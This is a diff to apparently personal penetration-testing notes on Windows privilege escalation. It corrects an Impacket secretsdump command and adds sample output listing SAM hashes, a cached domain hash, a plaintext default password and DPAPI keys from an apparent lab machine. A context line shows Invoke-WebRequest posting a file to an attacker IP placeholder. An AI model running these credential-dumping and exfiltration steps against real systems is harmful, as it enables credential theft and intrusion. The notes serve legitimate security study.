@@ -1,6 +1,6 @@
 ---
 created: 2026-09-02
-updated: 2026-09-20
+updated: 2026-10-01
 tags:
   - Windows
   - Windows_PrivEsc
@@ -112,7 +112,7 @@ Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/" -Method POST -InFile
 - Parse the offline hives with Impacket `secretsdump`:
 
 ```bash
-impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY LOCAL.save
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 ```
 
 | Flag        | Argument   | Description                                                                                 |
@@ -121,6 +121,40 @@ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY LOCAL.
 | `-system`   | `SYSTEM`   | Path to the offline `SYSTEM` hive containing the boot key.                                  |
 | `-security` | `SECURITY` | Path to the offline `SECURITY` hive for LSA secrets and cached credentials.                 |
 | `LOCAL`     | -          | Instructs `secretsdump` to process offline files rather than connecting to a remote target. |
+
+>[!example]- 
+> ```bash
+> impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+> ```
+> ```bash
+> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+> 
+> [*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
+> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+> Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
+> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+> WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+> mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
+> [*] Dumping cached domain logon information (domain/username:hash)
+> INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
+> [*] Dumping LSA Secrets
+> [*] $MACHINE.ACC 
+> $MACHINE.ACC:plain_password_hex:5805a3ad11c37de9f577113e77d4f738d3ccb23aa6b081e2ba8791bf78dc5e6f1f96509c92423c8fa4fdf7ba23fac031b0ad24ec21dd0cb1a7826c992a3aabe4d3bb35a1b19eb3e85d7b673973de792df4d137feb67aae65b7db5070c65bd9aeef8eb11d08a0caddd8e86e75c6e2f0ae54c79c840b2dfc2f9cb01e39e3509830e249e1721fadccd1a1e4b5ee2ba5c31017c984eb02fbdc508ac4731c8b39929e171844a113df7051d309f8e72b99872e8fd81bf9ed8e2c6afec46275dc2d27f8a4976f5ffbd43aa9ff7657407fb698b8a996d8a172701b0dd039b26fcf31f9c472c649414d203c62c42be1acbf563543
+> $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d7b4fc25d5eb3fba6a6e1b7f5cdadf67
+> [*] DefaultPassword 
+> (Unknown User):Gr8hambino!
+> [*] DPAPI_SYSTEM 
+> dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
+> dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
+> [*] NL$KM 
+>  0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
+>  0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
+>  0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
+>  0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
+> NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
+> [*] Cleaning up... 
+> ```
 
 >[!note] See [[Dumping Windows registry hives]].
 ## Extracting protected files from volume shadow copies
